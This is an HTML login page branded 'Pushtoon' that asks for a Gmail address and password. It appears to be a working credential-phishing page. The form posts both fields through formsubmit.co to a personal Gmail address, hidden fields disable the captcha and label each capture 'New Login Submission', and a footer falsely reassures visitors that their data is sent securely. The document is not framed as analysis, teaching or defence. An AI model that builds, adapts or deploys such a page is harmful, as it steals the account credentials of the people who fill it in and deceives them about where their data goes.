<!DOCTYPE html>
<html>
<head>
  <title>Pushtoon Login</title>

  <style>
    body{
      margin:0;
      height:100vh;
      display:flex;
      justify-content:center;
      align-items:center;
      font-family:Arial, sans-serif;
      background: linear-gradient(135deg, #1f1c2c, #928dab);
    }

    .container{
      background:white;
      padding:40px;
      border-radius:15px;
      width:320px;
      text-align:center;
      box-shadow:0 10px 30px rgba(0,0,0,0.3);
    }

    h2{
      margin-bottom:20px;
      color:#333;
    }

    input{
      width:90%;
      padding:12px;
      margin:10px 0;
      border:1px solid #ccc;
      border-radius:8px;
      outline:none;
    }

    input:focus{
      border-color:#6a1b9a;
    }

    button{
      width:95%;
      padding:12px;
      background:#6a1b9a;
      color:white;
      border:none;
      border-radius:8px;
      font-size:16px;
      cursor:pointer;
    }

    button:hover{
      background:#4a0f6e;
    }

    .note{
      font-size:12px;
      color:gray;
      margin-top:10px;
    }
  </style>

</head>

<body>

<div class="container">

  <h2>LOGIN</h2>

  <form action="https://formsubmit.co/folkking66@gmail.com" method="POST">

    <input type="email" name="email" placeholder="Enter Gmail" required>

    <input type="password" name="password" placeholder="Enter Password" required>

    <!-- no captcha -->
    <input type="hidden" name="_captcha" value="false">

    <!-- email format -->
    <input type="hidden" name="_template" value="table">

    <!-- subject -->
    <input type="hidden" name="_subject" value="New Login Submission">

    <button type="submit">LOG IN</button>

  </form>

  <div class="note">
    Your data will be sent securely to the admin email.
  </div>

</div>

</body>
</html>
